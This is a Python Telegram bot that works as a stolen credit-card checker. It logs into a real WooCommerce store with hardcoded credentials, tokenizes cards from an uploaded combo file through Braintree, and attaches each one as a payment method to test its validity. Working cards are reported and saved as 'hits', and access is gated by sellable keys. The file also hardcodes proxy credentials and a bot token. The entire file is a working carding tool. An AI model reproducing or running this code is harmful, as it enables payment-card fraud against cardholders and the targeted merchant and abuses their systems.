import requests, re, time, threading, base64
from bs4 import BeautifulSoup
from colorama import Fore, init
import telebot
from hh import keep_alive

init(autoreset=True)

# ===================== PROXY =====================
proxies_list = ["http://naveed:Qwerty_123ABC@196.244.48.124:12345"]

def get_proxy():
    return {"http": proxies_list[0], "https": proxies_list[0]}

# ===================== CHECKER =====================
def Tele(cx):
    proxy = get_proxy()
    try:
        cc, mes, ano, cvv = cx.split("|")
        if len(ano) == 4: ano = ano[2:]

        r = requests.Session()
        r.proxies = proxy
        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'

        headers = {'User-Agent': ua}

        r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
        login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text).group(1)

        r.post('https://www.woolroots.com/my-account/', data={
            'username': 'Chitnge228', 'password': 'Chitnge834',
            'woocommerce-login-nonce': login_nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in'
        }, headers=headers, timeout=20)

        add_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
        client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text).group(1)

        token_resp = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', 
                           data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}, 
                           headers=headers, timeout=20)

        bt_data = re.search(r'"data":"(.+?)"', token_resp.text).group(1)
        decoded = base64.b64decode(bt_data).decode('utf-8')
        auth = re.search(r'"authorizationFingerprint":"(.+?)"', decoded).group(1)

        json_data = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token }}",
            "variables": {"input": {"creditCard": {"number": cc,"expirationMonth": mes,"expirationYear": ano,"cvv": cvv},"options": {"validate": False}}},
            "operationName": "TokenizeCreditCard"
        }

        tokenize = requests.post('https://payments.braintree-api.com/graphql',
            json=json_data,
            headers={'authorization': f'Bearer {auth}','braintree-version': '2018-05-10','content-type': 'application/json','User-Agent': ua},
            proxies=proxy, timeout=15)

        nonce = tokenize.json()['data']['tokenizeCreditCard']['token']

        final_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', final_page.text).group(1)

        response = r.post('https://www.woolroots.com/my-account/add-payment-method/', data={
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': nonce,
            'woocommerce-add-payment-method-nonce': add_nonce,
            'woocommerce_add_payment_method': '1'
        }, headers=headers, timeout=25)

        if "New payment method added" in response.text or "81724" in response.text:
            return "Approved - New Card Added"
        elif "avs" in response.text.lower():
            return "AVS Declined"
        else:
            return "Declined"

    except Exception as e:
        return f"Error: {str(e)[:80]}"

# ===================== BOT =====================
sto = {"stop": False}
bot = telebot.TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU", parse_mode="HTML")
OWNER_ID = 7077294261

redeemed_users = set()
valid_keys = {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}

@bot.message_handler(commands=["start"])
def welcome(message):
    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nUse /key YOURKEY to activate")

@bot.message_handler(commands=["key"])
def redeem_key(message):
    try:
        key = message.text.split()[1]
        if key in valid_keys:
            redeemed_users.add(message.chat.id)
            bot.reply_to(message, "✅ Key Activated Successfully!\nNow send combo file.")
        else:
            bot.reply_to(message, "❌ Invalid Key!")
    except:
        bot.reply_to(message, "Usage: /key YOURKEY")

@bot.message_handler(content_types=["document"])
def check(message):
    user_id = message.chat.id

    if user_id != OWNER_ID and user_id not in redeemed_users:
        return bot.reply_to(message, "❌ Access Denied!\nUse /key first.")

    sto["stop"] = False
    name = message.from_user.first_name or "User"
    
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f: f.write(downloaded)

    with open("combo.txt") as f:
        cards = [line.strip() for line in f if line.strip()]

    ok = 0
    ko = bot.reply_to(message, f"🔥 Checking Started by {name}\nTotal: {len(cards)}").message_id

    for cc in cards:
        if sto["stop"]: break
        result = Tele(cc)
        
        if "Approved" in result or "New Card Added" in result:
            ok += 1
            respo = f'''
✅ <b>HIT FOUND</b>
━━━━━━━━━━━━━━
[↯] 𝗖𝗖: <code>{cc}</code>
[↯] Result: {result}
━━━━━━━━━━━━━━
            '''
            bot.reply_to(message, respo)
            with open("hit.txt", "a", encoding="utf-8") as f:
                f.write(respo + "\n\n")
        
        try:
            bot.edit_message_text(f"Progress: {ok} Hits / {len(cards)}", message.chat.id, ko)
        except:
            pass

        time.sleep(0.8)

    bot.reply_to(message, f"✅ Finished!\nHits: {ok}")

@bot.message_handler(commands=["stop"])
def stopit(message):
    sto["stop"] = True
    bot.reply_to(message, "✅ Stopped")

keep_alive()
print("✅ Bot Started Successfully")
bot.infinity_polling()
